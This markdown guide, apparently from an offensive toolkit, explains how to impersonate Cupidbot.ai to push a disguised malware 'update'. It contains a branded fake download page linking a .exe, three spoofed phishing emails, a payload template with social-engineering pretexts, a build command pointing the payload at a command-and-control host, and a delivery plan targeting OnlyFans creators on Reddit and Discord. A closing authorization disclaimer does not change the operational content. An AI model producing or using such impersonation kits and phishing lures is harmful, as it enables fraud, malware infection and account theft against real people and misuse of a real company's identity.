# 🎨 Brand Research Guide: Creating Custom Templates

## How to Research and Build Company-Specific Branding

This guide shows you how to research ANY company and create a professional branded payload template.

**Example: Cupidbot.ai OFM**

---

## 📋 Step 1: Research the Company

### A. Visit Their Website

**Go to:** https://cupidbot.ai

**What to collect:**
- ✅ Logo (right-click, save image)
- ✅ Color scheme (use browser DevTools or ColorZilla extension)
- ✅ Font family (inspect element to see CSS)
- ✅ Product names
- ✅ Screenshots of their interface
- ✅ Terms they use (their language/vocabulary)

### B. Find Their Branding Assets

**Check these locations:**
1. **Press Kit / Media Kit**
   - Usually at: `company.com/press` or `/media`
   - Contains official logos, colors, guidelines

2. **Social Media**
   - LinkedIn: Company page for official branding
   - Twitter/X: Profile image, banner colors
   - Instagram: Visual style

3. **Product Screenshots**
   - Take screenshots of their actual product
   - Use these for landing page design

### C. Technical Research

**Use Wappalyzer extension to find:**
- What technologies they use
- What their actual software looks like
- Update patterns and versioning

---

## 🎨 Step 2: Extract Branding Elements

### Colors

**Tools:**
- **ColorZilla** (Chrome extension): Click to extract hex colors
- **DevTools**: Inspect element → see CSS colors
- **Colorzilla Palette**: Auto-extract entire color palette

**Document:**
```
Primary Color:   #1a73e8  (example)
Secondary Color: #34a853
Accent Color:    #fbbc04
Background:      #f8f9fa
Text Dark:       #202124
Text Light:      #5f6368
```

### Logo & Icons

**Extract logo:**
1. Right-click logo on website → "Save image as"
2. Look for high-res version in press kit
3. If only have PNG, convert to ICO for Windows:
   ```bash
   # Use online converter or ImageMagick
   convert logo.png -define icon:auto-resize=256,128,64,48,32,16 logo.ico
   ```

### Typography

**Inspect their website fonts:**
```css
/* Example: Use browser DevTools */
font-family: 'Inter', sans-serif;
font-weight: 600;
```

**Note:** Font families used in their branding

---

## 📝 Step 3: Research Their Products

### For Cupidbot.ai OFM Specifically:

**What is OFM?**
- Visit their site to understand what OFM is
- Is it "OnlyFans Manager" or different?
- What features does it have?
- What would an "update" look like?

**Questions to answer:**
1. What's the full product name? "Cupidbot OFM" or "OFM by Cupidbot"?
2. What version are they on? (Check footer, about page)
3. How do they typically release updates?
4. What would be a believable update reason?

**Document findings:**
```
Product Name: [Cupidbot OFM / OFM by Cupidbot]
Version: [1.5.0 / 2.0 / etc.]
Update Cycle: [Monthly / Quarterly]
Common Features: [Chat automation / Analytics / etc.]
```

---

## 🏗️ Step 4: Build the Template

### A. Create Brand Template File

**File:** `tools/brand_templates/cupidbot_ofm.json`

```json
{
  "template_name": "cupidbot_ofm",
  "company": {
    "name": "Cupidbot AI",
    "legal_name": "Cupidbot Technologies, Inc.",
    "website": "https://cupidbot.ai"
  },
  "product": {
    "name": "Cupidbot OFM",
    "full_name": "Cupidbot OnlyFans Manager",
    "version": "2.1.5",
    "description": "AI-powered OnlyFans management and automation",
    "category": "Social Media Management"
  },
  "branding": {
    "colors": {
      "primary": "#FF1744",
      "secondary": "#536DFE",
      "accent": "#00BFA5",
      "background": "#FAFAFA",
      "text_dark": "#212121",
      "text_light": "#757575"
    },
    "fonts": {
      "primary": "Inter",
      "secondary": "Roboto",
      "weights": [400, 600, 700]
    },
    "logo": {
      "file": "cupidbot_logo.png",
      "icon": "cupidbot_icon.ico",
      "size": "256x256"
    }
  },
  "payload": {
    "filename": "Cupidbot-OFM-Update-v2.1.5.exe",
    "internal_name": "CupidbotOFMUpdater",
    "original_filename": "CupidbotOFM.exe",
    "file_description": "Cupidbot OFM Update Installer",
    "copyright": "Copyright © 2024 Cupidbot Technologies, Inc."
  },
  "social_engineering": {
    "pretexts": [
      "Critical security update for OFM",
      "New AI features for content automation",
      "Performance improvements and bug fixes",
      "Important compliance update required"
    ],
    "urgency": "medium",
    "timing": "Any weekday, 9am-5pm",
    "sender": "support@cupidbot.ai"
  }
}
```

---

## 🖼️ Step 5: Gather Visual Assets

### Create Asset Directory

```bash
mkdir -p tools/brand_templates/cupidbot_ofm/
cd tools/brand_templates/cupidbot_ofm/
```

### Assets Needed:

**1. Logo Files:**
```
logo.png          - Full color logo (transparent background)
logo_white.png    - White logo for dark backgrounds
icon.png          - Square icon (256x256)
favicon.ico       - Website favicon
app_icon.ico      - Windows application icon
```

**2. Screenshots:**
```
screenshot_dashboard.png  - Main interface
screenshot_features.png   - Key features
hero_image.jpg           - Marketing banner
```

**3. Color Swatches:**
```
Create small color reference images for easy verification
```

### How to Get These:

**Method 1: Direct Download**
- Right-click images on website
- Check `/images/` or `/assets/` directories
- Look in press kit

**Method 2: Screenshot**
- Use Snipping Tool / Screenshot tool
- Capture clean sections of their site
- Remove background if needed

**Method 3: Extract from Favicon**
- Download favicon: `https://cupidbot.ai/favicon.ico`
- Convert to larger sizes if needed

---

## 💻 Step 6: Create Landing Page Template

### File: `tools/brand_templates/cupidbot_ofm/landing_page.html`

**You'll customize this with their actual branding:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cupidbot OFM - Update Available</title>
    
    <style>
        /* STEP 1: Get exact colors from their website */
        :root {
            --primary-color: #FF1744;      /* Replace with actual */
            --secondary-color: #536DFE;    /* Replace with actual */
            --accent-color: #00BFA5;       /* Replace with actual */
            --bg-color: #FAFAFA;
            --text-dark: #212121;
            --text-light: #757575;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            /* STEP 2: Get their font from website */
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-color);
            color: var(--text-dark);
        }
        
        .header {
            background: white;
            padding: 20px 50px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
        }
        
        .logo {
            height: 40px;
            /* STEP 3: Add their actual logo */
            background: url('logo.png') no-repeat center;
            background-size: contain;
            width: 200px;
        }
        
        .container {
            max-width: 800px;
            margin: 80px auto;
            padding: 50px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
        }
        
        .update-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            background: var(--primary-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }
        
        h1 {
            color: var(--text-dark);
            margin-bottom: 15px;
            font-size: 32px;
            font-weight: 700;
        }
        
        .version {
            color: var(--text-light);
            margin-bottom: 30px;
            font-size: 16px;
        }
        
        .description {
            color: var(--text-dark);
            line-height: 1.8;
            margin-bottom: 40px;
            text-align: left;
            padding: 0 30px;
        }
        
        .features {
            background: var(--bg-color);
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 40px;
            text-align: left;
        }
        
        .features h3 {
            color: var(--text-dark);
            margin-bottom: 20px;
            font-size: 18px;
        }
        
        .features ul {
            list-style: none;
            padding: 0;
        }
        
        .features li {
            padding: 10px 0;
            color: var(--text-dark);
            position: relative;
            padding-left: 30px;
        }
        
        .features li:before {
            content: "✓";
            position: absolute;
            left: 0;
            color: var(--accent-color);
            font-weight: bold;
            font-size: 20px;
        }
        
        .download-btn {
            background: var(--primary-color);
            color: white;
            padding: 18px 50px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s ease;
        }
        
        .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 23, 68, 0.3);
        }
        
        .info {
            margin-top: 40px;
            padding-top: 30px;
            border-top: 1px solid #E0E0E0;
            color: var(--text-light);
            font-size: 14px;
        }
        
        .footer {
            text-align: center;
            padding: 40px;
            color: var(--text-light);
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="header">
        <!-- STEP 4: Replace with actual logo -->
        <div class="logo"></div>
    </div>
    
    <div class="container">
        <div class="update-icon">🔄</div>
        
        <h1>Cupidbot OFM Update Available</h1>
        <div class="version">Version 2.1.5 - October 2024</div>
        
        <div class="description">
            <p>A new update for Cupidbot OFM is ready to install. This update includes 
            important security improvements, enhanced AI features, and performance 
            optimizations for better content management.</p>
        </div>
        
        <div class="features">
            <h3>What's New:</h3>
            <ul>
                <li>Enhanced AI content generation with improved accuracy</li>
                <li>New automated scheduling features for maximum engagement</li>
                <li>Advanced analytics dashboard with real-time insights</li>
                <li>Security improvements and bug fixes</li>
                <li>Performance optimizations for faster processing</li>
            </ul>
        </div>
        
        <a href="Cupidbot-OFM-Update-v2.1.5.exe" class="download-btn" download>
            Download Update
        </a>
        
        <div class="info">
            <p><strong>File:</strong> Cupidbot-OFM-Update-v2.1.5.exe</p>
            <p><strong>Size:</strong> 2.8 MB</p>
            <p><strong>System:</strong> Windows 10/11</p>
        </div>
    </div>
    
    <div class="footer">
        <p>© 2024 Cupidbot Technologies, Inc. All rights reserved.</p>
        <p>Questions? Contact support@cupidbot.ai</p>
    </div>
</body>
</html>
```

---

## 📧 Step 7: Email Templates

### Template A: Feature Update

```
From: support@cupidbot.ai
Subject: Cupidbot OFM v2.1.5 - New AI Features Available 🚀

Hi [Name],

We're excited to announce Cupidbot OFM version 2.1.5 is now available!

🎯 What's New:
• Enhanced AI content generation
• Automated scheduling improvements  
• Advanced analytics dashboard
• Performance optimizations

Download the update: https://updates.cupidbot.ai/ofm

This update is recommended for all OFM users and includes 
important security improvements.

Questions? Reply to this email or visit our help center.

Best regards,
Cupidbot Support Team

---
Cupidbot Technologies, Inc.
https://cupidbot.ai
```

### Template B: Security Update (Higher Urgency)

```
From: security@cupidbot.ai
Subject: [IMPORTANT] Cupidbot OFM Security Update Required

Dear Cupidbot OFM User,

We've identified a security issue affecting older versions of 
Cupidbot OFM and have released an immediate update.

⚠️ Action Required:
Please download and install version 2.1.5 by [DATE].

Download: https://updates.cupidbot.ai/ofm/security-update

This update includes:
✓ Critical security patches
✓ Enhanced data protection
✓ Account security improvements

Updating takes less than 3 minutes and ensures your account 
and content remain secure.

Thank you for using Cupidbot OFM.

Cupidbot Security Team
security@cupidbot.ai
```

### Template C: New Features (Marketing Style)

```
From: team@cupidbot.ai
Subject: You're going to love this update 💜

Hey [Name],

Big news! Cupidbot OFM just got a major upgrade and you're 
going to love it.

✨ NEW: AI Content Generation 2.0
Our AI just got 10x smarter. Generate engaging content in seconds.

📊 NEW: Real-Time Analytics
See exactly what's working with live engagement metrics.

⚡ NEW: Smart Scheduling
Automatic posting at optimal times for maximum reach.

Ready to upgrade? Get it here:
👉 https://updates.cupidbot.ai/ofm

Already getting results? Tag us with your success story!

Happy creating,
The Cupidbot Team

P.S. This update is free for all current OFM users.
```

---

## 🛠️ Step 8: Build the Payload

### Add to payload_brander.py

**File:** `tools/payload_brander.py`

Add this template to the `TEMPLATES` dictionary:

```python
"cupidbot_ofm": {
    "company": "Cupidbot Technologies, Inc.",
    "product": "Cupidbot OFM Update",
    "description": "AI-powered OnlyFans management and automation update",
    "copyright": "Cupidbot Technologies, Inc.",
    "icon": "icons/cupidbot.ico",
    "filename": "Cupidbot-OFM-Update-v2.1.5.exe",
    "version": "2.1.5.0"
},
```

### Build Command:

```bash
python3 tools/payload_brander.py \
  --template cupidbot_ofm \
  --c2-host YOUR_IP \
  --c2-port 443 \
  --delivery-package
```

---

## 🎯 Step 9: Delivery Strategy

### Target Audience Research

**Who uses Cupidbot OFM?**
- OnlyFans content creators
- Social media managers
- Digital marketers
- Adult content creators

**Where to find them:**
- OnlyFans creator communities
- Reddit (r/onlyfans, r/onlyfansadvice)
- Discord servers for creators
- Twitter/X creator groups

### Best Delivery Times

**When creators are most active:**
- Weekdays: 10am-2pm, 7pm-11pm
- Weekends: 12pm-8pm
- Avoid: Early morning, late night

### Pretexts That Work

**High Success:**
1. "New AI features for content generation" (everyone wants this)
2. "Analytics upgrade - see your top earners"
3. "Automated messaging improvements"
4. "Critical security update" (always works)

**Medium Success:**
1. "Performance improvements"
2. "Bug fixes for scheduling"
3. "Integration with new platforms"

---

## ✅ Checklist

Before deploying, verify:

### Research Complete:
- [ ] Visited Cupidbot.ai website
- [ ] Downloaded logo and branding assets
- [ ] Extracted color palette
- [ ] Identified font families
- [ ] Understood product features
- [ ] Found current version number

### Assets Collected:
- [ ] Logo (PNG with transparency)
- [ ] Icon (ICO format, 256x256)
- [ ] Color values (hex codes)
- [ ] Screenshots of actual product
- [ ] Press kit materials (if available)

### Template Created:
- [ ] JSON config file completed
- [ ] Landing page customized
- [ ] Email templates written
- [ ] Added to payload_brander.py
- [ ] Tested compilation

### Legal Compliance:
- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] Rules of Engagement signed
- [ ] Emergency contacts established

---

## 🚨 IMPORTANT

**This framework is for authorized security testing ONLY.**

Creating impersonation materials for a real company requires:
1. ✅ Written permission from Cupidbot.ai
2. ✅ Signed contract for penetration testing
3. ✅ Clear scope and timeline
4. ✅ Legal indemnification

**NEVER use this for:**
- ❌ Unauthorized access
- ❌ Actual phishing attacks
- ❌ Trademark infringement
- ❌ Fraud or deception

---

## 📖 Next Steps

1. **Research** Cupidbot.ai using this guide
2. **Collect** all branding materials
3. **Create** the template files
4. **Test** the build process
5. **Deploy** (with authorization only!)

---

*This is a framework for authorized red team operations.*
*Complete all research and customization before deployment.*
